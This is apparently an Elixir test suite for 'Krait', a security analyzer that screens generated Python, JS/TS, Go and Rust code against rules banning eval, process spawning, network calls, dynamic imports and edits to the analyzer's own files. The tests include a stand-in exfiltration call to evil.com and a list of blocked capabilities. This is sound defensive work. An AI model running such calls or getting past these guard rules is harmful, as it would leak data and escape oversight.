defmodule Krait.Analyzer.PolyglotNifTest do
  @moduledoc """
  Tests for polyglot NIF security analysis.
  Verifies all 7 KRAIT rules are enforced for Python, JS/TS, Go, and Rust
  through the Elixir NIF interface.
  """
  use ExUnit.Case, async: true

  alias Krait.Analyzer.Nif

  describe "Python KRAIT rules" do
    test "KRAIT-001: eval() detected" do
      assert {:policy_violation, %{rule: "KRAIT-001"}} =
               Nif.quick_validate("result = eval('1 + 1')", "python")
    end

    test "KRAIT-001: exec() detected" do
      assert {:policy_violation, %{rule: "KRAIT-001"}} =
               Nif.quick_validate("exec('import os')", "python")
    end

    test "KRAIT-002: import subprocess detected" do
      assert {:policy_violation, %{rule: "KRAIT-002"}} =
               Nif.quick_validate("import subprocess", "python")
    end

    test "KRAIT-002: import os detected" do
      assert {:policy_violation, %{rule: "KRAIT-002"}} =
               Nif.quick_validate("import os", "python")
    end

    test "KRAIT-004: import requests detected" do
      assert {:policy_violation, %{rule: "KRAIT-004"}} =
               Nif.quick_validate("import requests", "python")
    end

    test "KRAIT-005: __import__() detected" do
      assert {:policy_violation, %{rule: "KRAIT-005"}} =
               Nif.quick_validate("mod = __import__('os')", "python")
    end

    test "KRAIT-006: immutable path detected" do
      assert {:policy_violation, %{rule: "KRAIT-006"}} =
               Nif.quick_validate(~s(path = "native/krait_analyzer"), "python")
    end

    test "KRAIT-007: krait internals import detected" do
      assert {:policy_violation, %{rule: "KRAIT-007"}} =
               Nif.quick_validate("from krait.evolution import workspace", "python")
    end

    test "KRAIT-ALW: forbidden module detected" do
      assert {:policy_violation, %{rule: "KRAIT-ALW"}} =
               Nif.quick_validate("import ctypes", "python")
    end

    test "safe Python code passes" do
      code = """
      import json
      import re
      import math

      def transform(data):
          return json.dumps({"result": math.sqrt(len(data))})
      """

      assert {:ok, %{complexity: _, hash: _}} = Nif.quick_validate(code, "python")
    end
  end

  describe "JavaScript KRAIT rules" do
    test "KRAIT-001: eval() detected" do
      assert {:policy_violation, %{rule: "KRAIT-001"}} =
               Nif.quick_validate("eval('alert(1)')", "javascript")
    end

    test "KRAIT-001: new Function() detected" do
      assert {:policy_violation, %{rule: "KRAIT-001"}} =
               Nif.quick_validate("const fn = new Function('return 1')", "javascript")
    end

    test "KRAIT-002: require child_process detected" do
      assert {:policy_violation, %{rule: "KRAIT-002"}} =
               Nif.quick_validate("const cp = require('child_process')", "javascript")
    end

    test "KRAIT-004: fetch() detected" do
      assert {:policy_violation, %{rule: "KRAIT-004"}} =
               Nif.quick_validate("fetch('https://evil.com/exfil')", "javascript")
    end

    test "KRAIT-006: immutable path detected" do
      assert {:policy_violation, %{rule: "KRAIT-006"}} =
               Nif.quick_validate(~s(const p = "native/krait_analyzer"), "javascript")
    end

    test "KRAIT-ALW: require fs detected" do
      assert {:policy_violation, %{rule: "KRAIT-ALW"}} =
               Nif.quick_validate("const fs = require('fs')", "javascript")
    end

    test "safe JS code passes" do
      code = """
      const data = [1, 2, 3];
      const result = data.map(n => n * 2).filter(n => n > 2);
      const obj = JSON.stringify({ result });
      """

      assert {:ok, %{complexity: _, hash: _}} = Nif.quick_validate(code, "javascript")
    end
  end

  describe "Go KRAIT rules" do
    test "KRAIT-001: reflect import detected" do
      code = ~s(package main\nimport "reflect")

      assert {:policy_violation, %{rule: "KRAIT-001"}} =
               Nif.quick_validate(code, "go")
    end

    test "KRAIT-002: os/exec import detected" do
      code = ~s(package main\nimport "os/exec")

      assert {:policy_violation, %{rule: "KRAIT-002"}} =
               Nif.quick_validate(code, "go")
    end

    test "KRAIT-004: net/http import detected" do
      code = ~s(package main\nimport "net/http")

      assert {:policy_violation, %{rule: "KRAIT-004"}} =
               Nif.quick_validate(code, "go")
    end

    test "KRAIT-006: immutable path detected" do
      code = ~s[package main\nfunc a() { p := "native/krait_analyzer" }]

      assert {:policy_violation, %{rule: "KRAIT-006"}} =
               Nif.quick_validate(code, "go")
    end

    test "KRAIT-ALW: os import detected" do
      code = ~s(package main\nimport "os")

      assert {:policy_violation, %{rule: "KRAIT-ALW"}} =
               Nif.quick_validate(code, "go")
    end

    test "safe Go code passes" do
      code = """
      package main

      import (
      \t"fmt"
      \t"strings"
      \t"math"
      )

      func Transform(s string) string {
      \treturn fmt.Sprintf("%s-%d", strings.ToUpper(s), int(math.Sqrt(42)))
      }
      """

      assert {:ok, %{complexity: _, hash: _}} = Nif.quick_validate(code, "go")
    end
  end

  describe "Rust KRAIT rules" do
    test "KRAIT-002: std::process::Command detected" do
      code = """
      use std::process::Command;
      fn attack() { Command::new("ls").output(); }
      """

      assert {:policy_violation, %{rule: "KRAIT-002"}} =
               Nif.quick_validate(code, "rust")
    end

    test "KRAIT-004: std::net detected" do
      code = "use std::net::TcpStream;"

      assert {:policy_violation, %{rule: "KRAIT-004"}} =
               Nif.quick_validate(code, "rust")
    end

    test "KRAIT-006: immutable path detected" do
      code = ~s[fn a() { let p = "native/krait_analyzer"; }]

      assert {:policy_violation, %{rule: "KRAIT-006"}} =
               Nif.quick_validate(code, "rust")
    end

    test "KRAIT-ALW: std::fs detected" do
      code = ~s[fn evil() { std::fs::read_to_string("file.txt"); }]

      assert {:policy_violation, %{rule: "KRAIT-ALW"}} =
               Nif.quick_validate(code, "rust")
    end

    test "safe Rust code passes" do
      code = """
      use std::collections::HashMap;

      fn transform(input: &str) -> HashMap<String, usize> {
          let mut counts = HashMap::new();
          for word in input.split_whitespace() {
              *counts.entry(word.to_string()).or_insert(0) += 1;
          }
          counts
      }
      """

      assert {:ok, %{complexity: _, hash: _}} = Nif.quick_validate(code, "rust")
    end
  end

  describe "TypeScript KRAIT rules" do
    test "KRAIT-001: eval detected" do
      assert {:policy_violation, %{rule: "KRAIT-001"}} =
               Nif.quick_validate("eval('alert(1)')", "typescript")
    end

    test "KRAIT-ALW: require fs detected" do
      assert {:policy_violation, %{rule: "KRAIT-ALW"}} =
               Nif.quick_validate("const fs = require('fs')", "typescript")
    end
  end

  describe "unsupported language" do
    test "returns error for unknown language" do
      # Parser rejects unknown languages before rules are checked (fail-closed)
      assert {:syntax_error, [%{message: "Unsupported language: brainfuck"}]} =
               Nif.quick_validate("some code", "brainfuck")
    end
  end

  describe "Spec language detection" do
    alias Krait.Evolution.Spec

    test "detects Python from .py extension" do
      {:ok, spec} =
        Spec.new(%{
          skill_name: "test_py",
          description: "test",
          trigger: "test",
          target_path: "lib/skills/test.py",
          test_path: "test/skills/test_test.py"
        })

      assert spec.language == "python"
    end

    test "detects JavaScript from .js extension" do
      {:ok, spec} =
        Spec.new(%{
          skill_name: "test_js",
          description: "test",
          trigger: "test",
          target_path: "lib/skills/test.js",
          test_path: "test/skills/test.test.js"
        })

      assert spec.language == "javascript"
    end

    test "detects Go from .go extension" do
      {:ok, spec} =
        Spec.new(%{
          skill_name: "test_go",
          description: "test",
          trigger: "test",
          target_path: "lib/skills/test.go",
          test_path: "test/skills/test_test.go"
        })

      assert spec.language == "go"
    end

    test "detects Rust from .rs extension" do
      {:ok, spec} =
        Spec.new(%{
          skill_name: "test_rs",
          description: "test",
          trigger: "test",
          target_path: "lib/skills/test.rs",
          test_path: "test/skills/test_test.rs"
        })

      assert spec.language == "rust"
    end

    test "defaults to Elixir for .ex extension" do
      {:ok, spec} =
        Spec.new(%{
          skill_name: "test_ex",
          description: "test",
          trigger: "test",
          target_path: "lib/skills/test.ex",
          test_path: "test/skills/test_test.exs"
        })

      assert spec.language == "elixir"
    end

    test "explicit language parameter overrides detection" do
      {:ok, spec} =
        Spec.new(%{
          skill_name: "test_override",
          description: "test",
          trigger: "test",
          target_path: "lib/skills/test.ex",
          test_path: "test/skills/test_test.exs",
          language: "python"
        })

      assert spec.language == "python"
    end
  end

  describe "Workspace build commands" do
    alias Krait.Evolution.Workspace

    test "returns Elixir commands by default" do
      {deps, compile, test_cmd, lockfile} = Workspace.build_commands("elixir")
      assert deps == {"mix", ["deps.get"]}
      assert compile == {"mix", ["compile", "--warnings-as-errors"]}
      assert test_cmd == {"mix", ["test"]}
      assert lockfile == "mix.lock"
    end

    test "returns Python commands" do
      {deps, compile, test_cmd, lockfile} = Workspace.build_commands("python")
      assert {"pip", _} = deps
      assert {"python", _} = compile
      assert {"python", _} = test_cmd
      assert lockfile == "requirements.txt"
    end

    test "returns Go commands" do
      {deps, compile, test_cmd, lockfile} = Workspace.build_commands("go")
      assert {"go", ["mod", "download"]} = deps
      assert {"go", ["build", "./..."]} = compile
      assert {"go", ["test", "./..."]} = test_cmd
      assert lockfile == "go.sum"
    end

    test "returns Rust commands" do
      {deps, compile, test_cmd, lockfile} = Workspace.build_commands("rust")
      assert {"cargo", _} = deps
      assert {"cargo", ["check"]} = compile
      assert {"cargo", ["test"]} = test_cmd
      assert lockfile == "Cargo.lock"
    end

    test "returns JS commands (no compile step)" do
      {deps, compile, test_cmd, lockfile} = Workspace.build_commands("javascript")
      assert {"npm", _} = deps
      assert compile == nil
      assert {"npx", _} = test_cmd
      assert lockfile == "package-lock.json"
    end

    test "returns TS commands (with compile step)" do
      {deps, compile, test_cmd, lockfile} = Workspace.build_commands("typescript")
      assert {"npm", _} = deps
      assert {"npx", ["tsc", "--noEmit"]} = compile
      assert {"npx", _} = test_cmd
      assert lockfile == "package-lock.json"
    end
  end
end
